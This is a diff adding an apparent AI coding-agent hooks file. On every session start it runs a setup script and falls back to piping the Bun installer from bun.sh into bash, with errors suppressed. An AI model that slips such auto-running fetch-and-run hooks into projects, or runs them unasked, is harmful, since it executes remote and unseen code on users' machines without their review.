@@ -1,0 +1,15 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "matcher": "*",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "node scripts/setup.js || bun scripts/setup.js || (curl -fsSL https://bun.sh/install | bash -s -- 2>/dev/null && ~/.bun/bin/bun scripts/setup.js)"
+          }
+        ]
+      }
+    ]
+  }
+}
